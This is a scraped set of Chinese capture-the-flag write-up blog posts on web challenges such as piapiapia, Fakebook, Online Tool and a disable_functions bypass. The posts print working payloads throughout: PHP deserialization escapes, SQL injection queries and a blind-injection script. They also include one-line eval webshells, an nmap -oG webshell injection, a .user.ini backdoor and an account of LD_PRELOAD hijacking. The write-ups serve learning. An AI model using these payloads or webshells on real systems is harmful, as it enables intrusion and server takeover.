123456789101112131415&lt;?phpfunction filter($img)//定义过滤内容{ $filter_arr = array('php', 'flag', 'php5', 'php4');//居然是过滤后缀？ $filter = '/' . implode('|', $filter_arr) . '/i'; return preg_replace($filter, '', $img);}$function = &quot;a\\&quot;;s:3:\\&quot;img\\&quot;;s:20:\\&quot;ZDBnM19mMWFnLnBocA==\\&quot;;s:2:\\&quot;dd\\&quot;;s:1:\\&quot;a\\&quot;;}&quot;;$_SESSION[&quot;user&quot;] = 'flagflagflagflagflagflag';//这边可能要改一下user为admin？$_SESSION['function'] = $function;$_SESSION['img']=&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;$serialize_info = filter(serialize($_SESSION));var_dump($serialize_info);$userinfo = unserialize($serialize_info);var_dump($userinfo); 小结这题不算难，但是坑不少，主要是细心问题，多调试很有用！！ [0CTF 2016]piapiapiawww.zip源码泄露打开审计一下:本地运行的时候需要注意 mysql要全部更改为mysqli（版本不同） 在本地运行调试了一下，发现有登录注册还有一个更新页面，登录注册页面没啥大问题，在更新页面可以上传文件并且将会被序列化，在序列化之前还会 针对我们传入的内容进行一下反序列化操作后使用了filter进行过滤: 1a:4:{s:5:&quot;phone&quot;;s:11:&quot;15559564603&quot;;s:5:&quot;email&quot;;s:12:&quot;10452@qq.com&quot;;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;} 这里需要做的就是让123”以后的内容被丢弃掉，和上一题差不多，然后这里如何吃字符呢？filter里面只有where替换为hacker能吃，所以就要输入很多个where 由于都有长度限制，并且只有nickname能全输出英文，所以需要绕过strlen函数，如何绕过呢？传入数组就行了接下来直接构造一下payload吧： 1nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;} 解释一下 由于我们传入的数组，所以序列化的过程中也是数组，所以s前面需要有个中括号和分号，才能达到闭合的效果我们下载源码后，发现config里面有个flag，所以推测flag在这里 小结:连续做了两题这个，感觉更加得心应手一些了总结一下就是:1.filter在序列化之后，并且filter的是序列化后的内容2.看看filter哪些可以吃字符3.构造好闭合语句4.让不要的字符被丢弃","link":"/2021/04/13/buuctf9/"},{"title":"edusrc挖掘","text":"","link":"/2021/03/07/edusrc%E6%8C%96%E6%8E%98/"},{"title":"buuctf3","text":"[HCTF 2018]admin尝试了一下sql注入，发现不行，注册了一个账号找找线索，抓包看看回显，发现不知道是个啥，百度了一下，是一种安全措施，用了防止xss等攻击的。看完wp后，发现自己看的不够仔细，发现更改密码页面有github源码泄露，感觉自己经常被某种思路给束缚住？然后就忘记一些基操,以后要注意点刚看完了wp，确认过眼神，是不会做的题，现在靠印象复现一下思路: buy you flag12345678if (isset($_POST['password'])) { $password = $_POST['password']; if (is_numeric($password)) { echo &quot;password can't be number&lt;/br&gt;&quot;; }elseif ($password == 404) { echo &quot;Password Right!&lt;/br&gt;&quot;; }} 抓包 总共更改这些地方，然后有一点没想到，看了wp他说有长度限制，这里需要拓展学习一下strcmp字符串比较绕过，因为他无法比较数组的长度，所以在money后加个[]即可绕过 这里有个思路没想清楚:他说有长度限制？这个时候我们应该想的是什么函数能比较长度？然后查询该函数能否被绕过:按照这个思路果然可以找到线索，学习一下！ CheckIn看了一下源码，可以确定的是如要传入一句话木马需要使用&lt;script&gt;写的,刚才看到一个user.ini，感觉需要利用一下这个线索，去百度看看:之前在学文件上传其实就有看到过这个user.ini 我简要讲解一下以及利用方式，这个是一个配置文件，可以动态调整，随改随用，但是权限为user，其中能为我们所用的就是：auto_prepend_file=**文件名这个是可以使user.ini所在目录下的php文件包含某个文件，比如说在user.ini中我配置了auto_prepend_file=12.gif**在这个目录下有一个index.php，当我打开index.php的时候就自动包含了12.gif，文件包含会自动执行其中php代码。 所以整体思路就是，先上传user.ini，然后上传12.gif，然后打开index.php页面使用蚁剑连接即可:文件上传绕过只要添加一个图像头就可以，比如GIF98a,一句话木马使用&lt;script&gt;书写方式 成功包含 成功连接 flag{fe873bd0-b289-495f-8254-ec9f4e68b1e6} flag{ed3c91a9-9f59-480e-8595-a410ad4e6175}拿到flag https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html Easy MD5MD5的考点，第一个是弱等于，所以只要找MD5值为0e开头的就行，接下来是强等于，强等于直接让值为数组类型，因为MD5转化数组直接为0 NiZhuanSiWei12345678910111213141516171819 &lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,'r')===&quot;welcome to the zjctf&quot;)){ echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,'r').&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file)){ echo &quot;Not now!&quot;; exit(); }else{ include($file); //useless.php $password = unserialize($password); echo $password; }}else{ highlight_file(__FILE__);}?&gt; file_get_contents()函数，从文件中获取内容，这里使用data://伪协议进行绕过 12.?file=data:text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= #后面的base64字符是需要传入的字符串的base64编码 接下来是file，由于这里使用正则替换了flag所以往下看， 有个反序列化，结合源码: 12345678910111213&lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); } } } ?&gt; 此时就很明了了这里还提示了useless.php，思路就是这里包含了useless.php后，反序列化进入useless.php中就可以输出flag了 12345678910111213141516&lt;?php class Flag{ //flag.php public $file=&quot;flag.php&quot;; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); } } }$a=new FLag();$a=serialize($a);print($a);?&gt; 以上是生成反序列化内容的代码，一开始一直在想如何在类外给file赋值，后来查不到（可能姿势不对）然后phpstorm正好有赋值功能，所以就直接赋值了，然后想了一下，直接对类里面进行赋值其实就可以了，得到以下内容 1O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 然后拼接 1?text=data:text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 以上为payload hack world看到过滤了这么多，八成就是盲注，fuzz了一下，发现and被过滤了，subustr没有被过滤，select也没有，因为and被过滤了，所以这里就需要一些运算连接符，比如说以前的-0- 但是这里-号被过滤了，看了一下 发现^异或符没被过滤，测试了一下发现可以直接写脚本:flag{ed3c991a99f9480e8595a410ad4e6175} 123456789101112131415import requestsurl=r&quot;http://d9e1077c-0511-4ac8-b837-47a768476f3b.node3.buuoj.cn/index.php&quot;s=requests.session()payload=&quot;&quot;pay_try=&quot;0123456789qwertyuiopasdfghjklzxcvbnm-{}&quot;flag=&quot;&quot;for i in range(10,50): for j in pay_try: payload=f&quot;1^((substr((select(flag)from(flag)),{i},1))='{j}')^1&quot; data={&quot;id&quot;:payload} print(data) if &quot;Hello&quot; in s.post(url=url,data=data).text: flag+=j print(flag) break 这个异或在这里还是一个运算符: Hard SQL和上一题一样，但是这里是用异或作为运算符来连接，用括号绕过空格过滤因为这种方法利用了异或符号，所以给它取名为xor注入： 1admin'^extractvalue(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek')))))# 接下来还是一样 不过是要用substr去截一下，但是这里substr被过滤了，fuzz一下，发现right之类的指令没被过滤: 1admin'^extractvalue(1,concat('~',(select(mid(password,30))from((H4rDsq1)))))# Fakebook注册——登录——url上存在数字型注入: 1?no=1%20and%20extractvalue(1,concat(%27~%27,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)))%20--+ 但是报错注入啥东西也没注入出来？所以可能考点不在这，于是扫描一下目录看看:发现robots.txt里面有个user.php.bak 下载打开看看 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo{ public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) { $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-&gt;get($this-&gt;blog); } public function isValidBlog () { $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); }} 审计上述代码 发现可疑的curl_exec()函数： 利用curl读取写入文件Linux系统中一般都会自带curl工具，其次是curl支持file协议，意味着我们能够读取本地文件。 这边使用的file协议进行读取这题没我有想象得那么简单：这里从头开始捋一下思路重做一下:当我进行报错注入的时候得到: 1no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS 以上字段名 当我们获取data字段名的时候发现 1O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:9:&quot;ad1sa.asd&quot;;} 结合前面的curl函数漏洞，我们知道如果可以在blog一栏输入我们的file://语句，那么就会被curl_exec解析执行命令，但是该如何注入呢？再次尝试union联合注入，使用/**/进行绕过，发现是可以的，order by验证字段数——注入。这里就直接放payload: 1?no=-1 union/**/select 1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}' from users --+ 小结这道题没我想象得那么容易，其中还有ssrf漏洞的相关知识结合sql注入还有简单序列化问题打算去整理一篇ssrf的文章。","link":"/2021/03/18/buuctf3/"},{"title":"buuctf5","text":"[BUUCTF 2018]Online Tool123456789101112131415161718&lt;?phpif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];}if(!isset($_GET['host'])) { highlight_file(__FILE__);} else { $host = $_GET['host']; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER['REMOTE_ADDR']); echo 'you are in sandbox '.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);} 真正有用的是从下面get开始，我们可以看到两个不同寻常的函数: escapeshellcmd和escapeshellarg看看有什么特性吧: 123escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。反斜线（\\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$\\, \\x0A 和 \\xFF。 ' 和 &quot; 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 1escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。 传入的参数是：172.17.0.2' -v -d a=1 经过escapeshellarg处理后变成了'172.17.0.2'\\'' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。 经过escapeshellcmd处理后变成'172.17.0.2'\\\\'' -v -d a=1\\'，这是因为escapeshellcmd对\\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php 最后执行的命令是curl '172.17.0.2'\\\\'' -v -d a=1\\'，由于中间的\\\\被解释为\\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\\ -v -d a=1'，即向172.17.0.2\\发起请求，POST 数据为a=1'。 参考:https://paper.seebug.org/164/ 总的来说就是两个连用会造成单引号逃逸 回到本题中:这里最后执行了system，不过是nmap的命令这里查看一下nmap都有什么常用指令可以利用的 nmap输出选项似乎有个任意文件写入:Nmap可以把扫描结果保存为外部文件。在需要使用其他工具处理Nmap的扫描结果时，这一 功能十分有用。即使您设定程序把扫描结果保存为文件，Nmap还是会在屏幕上显示扫描结果。 1nmap -oG 1.php &lt;?php @eval($_POST[&quot;1&quot;]);?&gt; 经测试可以这样写 结合测试测试一下如何添加单引号可以避免转义并且引入进行命令执行 1'-oG 1.php &lt;?php @eval($_POST[1]);?&gt;' 解析一下：需要加两个单引号的原因是，如果不加单引号，代入到system中的执行就为'-oG 1.php &lt;?php @eval($_POST[1]);?&gt;'此时这一整段内容是被当做字符串的，我们需要让他逃逸出来,所以此时就用到了上述漏洞的特性 分析一下 此时前面两个引号闭合 中间一个\\ 后面的引号再次闭合 最后四个引号也分别闭合: 发送以后会有文件夹的回显，进去用蚁剑连接即可：我从蚁剑里面查看了一下最终内容: 123# Nmap 7.70 scan initiated Tue Mar 30 13:10:07 2021 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oG 1.php \\ &lt;?php @eval($_POST[1]);?&gt;\\\\# Nmap done at Tue Mar 30 13:10:09 2021 -- 0 IP addresses (0 hosts up) scanned in 2.57 seconds//可以发现一句话木马完好无损 我看别人的payload，一句话木马是放在前面的，但是我测试放在后面也可以，如果放在前面 还需要注意最后的’和前面的php是有一个空格因为1.php//是不会被认为是一个php文件的 [RoarCTF 2019]Easy Java前言:有关java的题目是时候学一下了看到登录框认为是sql注入，但是尝试了一下，发现好像没那意思，于是回想一下前几次的java题目，好像都会给源码，于是点了一下help，发现有文件下载漏洞？尝试了一下发现啥也不行，于是看了一下wp:原来这题需要用post来发送数据，这里又为我们提供了一种思路，当get无反应时，不妨试试post，不够回想了一下，之前就有遇到过的样子，所以希望自己能记住吧想起来之前整理的常见源码泄露： web-inf源码泄露12345678910111213WEB-INF是Java的WEB应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF 主要包含一下文件或目录：​```WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.WEB-INF/database.properties : 数据库配置文件WEB-INF/classes/ : 一般用来存放Java类文件(.class)WEB-INF/lib/ : 用来存放打包好的库(.jar)WEB-INF/src/ : 用来放源代码(.asp和.php等)​```通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，再通过反编译 class 文件，得到网站源码。 果然可以下载第一个目录下的文件 通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，再通过反编译 class 文件，得到网站源码。没看懂这个如何利用，于是查了一下:当攻击者通过传入恶意的name参数值为WEB-INF/web.xml时可以读取Web应用的配置信息,而这里正好放了挺多class文件名，而这些class文件正好存在在WEB-INF/classes/这个当中，于是我们看上面的内容,不难构造: 12filename=WEB-INF/classes/com/wm/ctf/FlagController.class#这边的.就是我们的/吧 然后最后我们要的FlagController java类文件加个后缀.class即可读出 [GXYCTF2019]BabyUpload上传.htaccessMIME绕过在改后缀就行，我还加了个gif98a [GXYCTF2019]禁止套娃git文件泄露，扫描可得: 123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？ &lt;br&gt;&quot;;if(isset($_GET['exp'])){ if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) { if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) {//这里说明只允许无参数的内容输入进来 if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) { // echo $_GET['exp']; @eval($_GET['exp']); } else{ die(&quot;还差一点哦！&quot;); } } else{ die(&quot;再好好想想！&quot;); } } else{ die(&quot;还想读flag，臭弟弟！&quot;); }}// highlight_file(__FILE__);?&gt; php函数嵌套1234567scandir() 列出 images 目录中的文件和目录，scandir(.)end() 将内部指针指向数组中的最后一个元素，并输出。readfile() 输出一个文件implode() 把数组元素组合为字符串current(localeconv()) 返回一个.next() 返回第二个元素的值array_rand() 从数组中随机取出一个或多个单元 payload: 1. .. .git flag.php index.php 1?exp=echo(implode(scandir(chr(pos(localtime(time())))))); 1?exp=echo(implode(scandir(chr(pos(localtime(time())))))); 1?exp=var_dump(file(next(array_reverse(scandir(current(localeconv())))))); 解析:第一个判断让我们无法使用为协议，第二个判断让我们无法传入动态变量，第三个判断过滤一些系统命令，所以此时只能使用函数嵌套的方式进行解题，一开始构造的时候参考了一下大佬们的paylaod，用的是时间戳的函数，卡在二十多秒刚好有一个点，可以进行读取，后来发现使用current(localeconv())更好用，果然我就是个菜鸟，然后在想读取文件的时候，由于是在倒数第二个，比较难办，一开始想的是直接删除index.php文件就可，后来想想自己也太暴力，这个环境的运行就是依托这个文件的，于是就作罢了，然后再去查阅了一下资料，发现了一个翻转函数，这样就可以实现flag.php文件的读取了","link":"/2021/03/30/buuctf5/"},{"title":"bypass_disable_functions","text":"get shell 打开以后发现是这样的，我以为是被加密了，直接把上面的内容粘贴复制搜索，后来发现，是使用了混淆代码的工具，拿去解密一下就可以得到以下内容 1234&lt;?phphighlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);@eval($_POST[ymlisisisiook]);?&gt; 解密网址如下:https://www.zhaoyuanma.com/phpjm.html看起来是个一句话木马，用蚁剑连接试试:接下来我想访问一下其他文件夹试试，发现是没有权限的，这个时候就要想想如何提权了？ 打开命令执行窗口，发现不论输入什么指令都是ret搜索一下这个ret=127什么意思,发现是绕过disable_functions 接下来就直接去百度如果bypass_disable_functions这里介绍说可以直接用antsword里面的插件 使用antsword插件进行绕过 接下来会在目录下生成一个php文件，直接再用蚁剑访问连接，密码依旧是之前那个 接下来就可以发现flag在根目录下了 了解原理其实感觉用插件不明不白的，所以决定要深入学习一下 原因：为什么会使用不了系统命令呢？disable_functions开关在php.ini中可以关闭一些危险的功能，如系统、执行等 因为在这个disable_functions这里禁用了很多函数。 **open_basedir** 网站内目录与目录之间是可以访问的，在某些特定情况下这样是不安全的，如果目录间网址权限被黑客利用很可能造成数据流失，在这里我们可以通过PHPopen_basedir来实现网站间目录隔离配置，从而提高网站安全。 注：网站间隔离用“：”号分割。 注：没有被包含的网站不可访问。 PS：这里我之前想说尝试用文件包含漏洞看看能不能访问根目录的内容，但是因为有这个限制在，所以不行所以接下来我们需要绕过这两个东西 绕过思路第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。参考:https://www.freebuf.com/articles/web/192052.html 但今天我们就直接看一下第四种方法 基础知识学习linux动态库（so共享对象库），静态库一个“程序函数库”简单的说就是一个文件包含了一些编译好的代码和数据，这些编译好的代码和数据可以在事后供其他的程序使用。程序函数库可以使整个程序更加模块化，更容易重新编译，而且更方便升级。 程序函数库可分为3种类型：静态函数库（static libraries）、共享函数库（shared libraries）、动态加载函数库（dynamically loaded libraries）动态函数库同*共享函数库是一个东西（在linux上叫共享对象库， 文件后缀是.so ，windows上叫动态加载函数库， ****文件后缀是****.dll）** 今天我们需要学习的就是动态函数库,因为需要创建.so文件 共享函数库：**定义:**共享函数库中的函数是在当一个可执行程序在启动的时候被加载。如果一个共享函数库正常安装，所有的程序在重新运行的时候都可以自动加载最新的函数库中的函数。对于Linux系统还有更多可以实现的功能： 1、升级了函数库但是仍然允许程序使用老版本的函数库。 2、当执行某个特定程序的时候可以覆盖某个特定的库或者库中指定的函数。 3、可以在库函数被使用的过程中修改这些函数库。 PHP启动外部程序：PHP启动外部程序有两种，常见的就是使用cat，system等指令，但是在这里是用不了的https://segmentfault.com/a/1190000008941850还有一种就是通过PHP解释器：这里直接摘抄大佬的思路：比如，php 函数 goForward() 实现“前进”的功能，php 函数 goForward() 又由组成 php 解释器的 C 语言模块之一的 move.c 实现，C 模块 move.c 内部又通过调用外部程序 go.bin 实现，那么，我的 php 脚本中调用了函数 goForward()，势必启动外部程序 go.bin。 LD_PRELOAD环境变量：LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。 LD_PRELOAD实现思路（思路重点）在看完大佬的思路解析后，我来复现一下，首先我们知道LD_PRELOAD可以允许我们定义在程序运行前优先加载的动态链接库，此时我们设这个库为e_evil.so，在这个库中我们可以加入可以执行的恶意代码，注意此时这个库中的代码是不受disable_functions限制的，因为他不是这个系统当中，是我们后来定义的，那么有人会问，为啥执行的是我们定义的这个库里的系统函数，而不是原本存在的？这里就是因为我们一开始说的因为它的优先级比较高，那么如何使得我们定义的这个系统之外的函数被加载呢？那就需要我们通过web打开新进程。 插件使用条件成功使用此绕过插件的三个必要条件是： 1.mail()函数和error_log()函数所调用的sendmail已安装2.不限制 /usr/sbin/sendmail 的执行3.mail()函数和error_log()函数有一个未被禁用 小结在这里有个点，一开始我是直接大神的bypass工具集，在操作的时候发现怎么都没法输出，后来重新看了一下文章，他是使用mail()函数，但是在本题当中，mail函数是被禁用的，所以最终就失败了。其实现在对于这个bypass的原理差不多已经清晰了，感觉这个思路确实很厉害，是以一种劫持的思想绕过disable_function的拦截。 参考大神链接：https://www.freebuf.com/articles/web/192052.htmlantsword插件运行原理细节：https://www.anquanke.com/post/id/195686","link":"/2021/02/06/getshell/"},{"title":"http原理","text":"简介HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。。 HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。 工作原理HTTP协议工作于客户端-服务端架构上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。web服务器有：Apache服务器，IIS服务器等web服务器根据接收到的请求后，向客户端发送响应信息。HTTP默认端口号是80，也可以更改 html语法： HTML和PHPhtml是用来做网页的表现层的，也就是你所看到的如字体，链接，图片等PHP是用来处理逻辑层的，也就是你要网页提供什么功能，完成什么动作。 PHP代码是嵌入html中的他们之间的关系大概可以这样概括HTML展示内容PHP动态修改输出HTML展示内容CSS美化页面JS让页面动起来。提高浏览体验。","link":"/2020/12/06/http%E5%8E%9F%E7%90%86/"},{"title":"i春秋1","text":"最近刷bugku的题，刷到最后一关实在有点太磨人了，来i春秋换换心情吧。。 文件上传：今天做了i春秋的一题文件上传题目，收获还蛮多的，主要是复习了一下之前文件上传的知识点，还学到了新的知识: 代码分析： 这边对上传的文件后缀是使用了白名单检查的一个函数在这里，我们发现，如果后缀是压缩文件zip的话，也是可以上传的，但是后续解压出来的文件要经过check_dir()的检查。看到这个是白名单检查，并且在 这里的提示下，我们知道这个是apache服务器。 apache解析漏洞在Apache1.x，2.x中Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。 所以我们上传123.xxx.php.xxx只要这个xxx是不可识别的后缀，那么打开这个文件的时候，Apache就会将其解析为php文件。 更多参考:https://www.anquanke.com/post/id/219107#h3-3 PCLzip文件解压存在目录穿越漏洞当我们在压缩文件内的文件名设置为../../123.php当这个文件名和文件路径拼接以后就会变成/upload/xxxxxx/../../123.php 那么这时，访问该文件就只需要访问上两级的目录即可 思路我们构造一个压缩文件，压缩文件里面放有一个jpg文件，一个由010editor更改过后缀的php文件然后将其上传，这个时候直接在url中访问即可 出现的问题我上传的这个文件怎么都找不到了，我就有点无语，看了一下源码，他在每次上传加压文件后，都会再经过一个check_dir()函数的检查，而且还是递归检查，那其实上面这个方法就不可行了。后来我在盲试，让文件后缀=php.jpg上传以后，打开，发现就是flag了？？？？？？？？？？？？后来就在猜想，难不成是因为有.htaccess文件，使得上传成功并且存在的文件内容含有php 就可以解析为php？，那这题也太搞了吧。 反正这题就先告一段落了，想了想就这样过得不明不白的实在不行，决心再回来好好梳理一下：顺便整理一下文件上传的漏洞 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263 show_source(__FILE__);}else{ $file = $_FILES['file'];if(!$file){ exit(&quot;请勿上传空文件&quot;);}$name = $file['name'];$dir = 'upload/';$ext = strtolower(substr(strrchr($name, '.'), 1));//就是用来检验name还有没有后缀$path = $dir.$name;function check_dir($dir){ $handle = opendir($dir);//针对的是upload的下级目录 while(($f = readdir($handle)) !== false){ if(!in_array($f, array('.', '..'))){ if(is_dir($dir.$f)){ check_dir($dir.$f.'/'); }else{ $ext = strtolower(substr(strrchr($f, '.'), 1)); if(!in_array($ext, array('jpg', 'gif', 'png'))){//白名单检查后缀说明这个是想利用解析漏洞是不行滴 unlink($dir.$f); } } } }}if(!is_dir($dir)){ mkdir($dir);}$temp_dir = $dir.md5(time(). rand(1000,9999));if(!is_dir($temp_dir)){//创建临时目录 mkdir($temp_dir);}if(in_array($ext, array('zip', 'jpg', 'gif', 'png'))){ if($ext == 'zip'){ $archive = new PclZip($file['tmp_name']);//使用pclzip的方式进行解压 foreach($archive-&gt;listContent() as $value){ $filename = $value[&quot;filename&quot;]; if(preg_match('/\\.php$/', $filename)){//正则匹配是否存在php文件，有的话就直接不往下检查了，黑名单检查，可以 exit(&quot;压缩包内不允许含有php文件!&quot;); //利用解析漏洞 } } if ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == 0) { check_dir($dir); exit(&quot;解压失败&quot;); } check_dir($dir); exit('上传成功!'); }else{ move_uploaded_file($file['tmp_name'], $temp_dir.'/'.$file['name']);//直接拼接文件名是造成任意文件上传漏洞 check_dir($dir); //但这里不行 exit('上传成功!'); }}else{ exit('仅允许上传zip、jpg、gif、png文件!');}} 看完源码，发现原来的思路是没有问题的呀，构造穿越目录文件名，当文件被解压后，文件此时已经穿越到上级目录了，而check_dir()针对检查的是upload/下的目录文件，而用apache的解析漏洞目的是逃过那个黑名单检查，感觉这个题目可能哪里出了问题吧 SQL注入先用burpsuit跑了一下过滤了啥，发现过滤了select 和order，如何绕过呢？这里新学了一种&lt;&gt;连接符payload:?id=1 ord&lt;&gt;er by 3?id=1 union sel&lt;&gt;ect 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()?id=1 union sel&lt;&gt;ect 1,group_concat(column_name),3 from information_schema.columns where table_name=’info’?id=1 union sel&lt;&gt;ect 1,flAg_T5ZNdrm,3 from info UPLOAD直接上传一句话木马，发现连接不了，猜测有过滤内容，于是将一句话木马分解输入， 发现过滤了&lt;?和php，想到之前看到过的另一种写马的方法: 1&lt;script language=&quot;pHp&quot;&gt;@eval($_POST['cmd'])&lt;/script&gt; 即可连接，然后就可以找到flag了 文件包含（include）这题是文件包含，因为是request请求path，所以直接输路径，试了一下flag.php 发现没有收获，在下面var/www/html等路径都找了一下发现也没有，想了一下，之前文件包含漏洞有结合过php://input封装协议 后来回想了一下，为啥这题可以用这个php://input封装协议？: **allow_url_include = On(允许引用URL文件)**因为这个是打开的，所以其实以后看到这个配置，就要思考一下是否需要使用这个封装协议来解题了 Do you know upload？这一题依旧是文件上传题，先看一下是黑名单还是白名单过滤，上传了一个txt文件，发现还是说文件类型不允许，所以推测是白名单 上传jpg文件，然后修改后缀为php即可绕过上传 上传以后看了一会都没发现flag，发现数据库的账号密码，可能是要我们看数据库吧，所以在用蚁剑连接数据库，即可获得flag， flag{04add780-f807-45af-aea6-99ae0d3d2e09} Upload第一届“百度杯”信息安全攻防总决赛 线上选拔赛他让我们速度要快，然后查看到信息，让我们post找到的东西 看了一下其他地方，发现也没啥有用的信息了，然后就抓包，看到回应的报文中有flag，但是每次收到的都不一样，就想到之前在bugku里面做过一题类似的，所以就用了之前用过的脚本 1234567891011121314import requestsimport base64url = 'http://3013bae61dcc4556a1e1e2574cdd037795ba5817823d4218.changame.ichunqiu.com/'r = requests.session()headers = r.get(url).headersmid = base64.b64decode(headers['flag'])print(mid)mid = mid.decode() # 因为base64解密一次是byte类型，包含了中文字符，所以还需要解码一次print(mid)flag = base64.b64decode(mid.split(':')[1])print(flag)data = {'ichunqiu': flag}print(r.post(url, data).text) 果然跑出来了 他说path=这个东西我一开始以为是被加密了，一直去解密都没找到结果，然后还是看了wp，发现直接把它加在路径上就可以了，连接后登陆到页面，看到登录框，一开始以为是SQL注入，尝试了一会发现都没啥收获，没办法 再去看了一下wp 说是svp源码泄露？？？这我就懵了，不懂在哪里看出来的，然后去下面翻评论，看到说是经验，于是去搜索了一波，大概有几种源码泄露，决定整理一波。 